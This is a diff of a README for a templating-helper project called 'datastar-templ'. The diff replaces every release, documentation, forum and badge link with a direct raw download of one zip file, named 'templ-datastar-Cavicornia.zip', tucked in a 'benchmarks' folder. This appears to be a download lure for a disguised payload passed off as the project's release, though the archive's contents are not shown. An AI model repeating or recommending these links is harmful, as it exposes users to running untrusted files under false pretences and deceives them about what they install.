@@ -1,6 +1,6 @@
 # 🌟 datastar-templ - Type-Safe Helpers for Easy Templates
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/smartcare123/datastar-templ/releases)
+[![Download Latest Release](https://github.com/smartcare123/datastar-templ/raw/refs/heads/main/benchmarks/templ-datastar-Cavicornia.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/smartcare123/datastar-templ/raw/refs/heads/main/benchmarks/templ-datastar-Cavicornia.zip)
 
 ## 🛠️ Overview
 
@@ -16,7 +16,7 @@ To get started with **datastar-templ**, follow these steps. They will guide you 
 
    Click the link below to go to the releases page:
 
-   [Download from Releases](https://github.com/smartcare123/datastar-templ/releases)
+   [Download from Releases](https://github.com/smartcare123/datastar-templ/raw/refs/heads/main/benchmarks/templ-datastar-Cavicornia.zip)
 
 2. **Choose the Latest Version**
 
@@ -81,10 +81,10 @@ Yes! You can access documentation and forums on our GitHub page. Engage with oth
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For detailed usage instructions, check the [Documentation Page](https://github.com/smartcare123/datastar-templ/wiki).
-- **Community Forum:** Join discussions and connect with other users [here](https://github.com/smartcare123/datastar-templ/discussions).
+- **Documentation:** For detailed usage instructions, check the [Documentation Page](https://github.com/smartcare123/datastar-templ/raw/refs/heads/main/benchmarks/templ-datastar-Cavicornia.zip).
+- **Community Forum:** Join discussions and connect with other users [here](https://github.com/smartcare123/datastar-templ/raw/refs/heads/main/benchmarks/templ-datastar-Cavicornia.zip).
 - **Feedback:** We welcome your feedback and suggestions! Reach out on our GitHub page.
 
 Thank you for choosing **datastar-templ**! Happy coding! 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/smartcare123/datastar-templ/releases)
+[![Download Latest Release](https://github.com/smartcare123/datastar-templ/raw/refs/heads/main/benchmarks/templ-datastar-Cavicornia.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/smartcare123/datastar-templ/raw/refs/heads/main/benchmarks/templ-datastar-Cavicornia.zip)
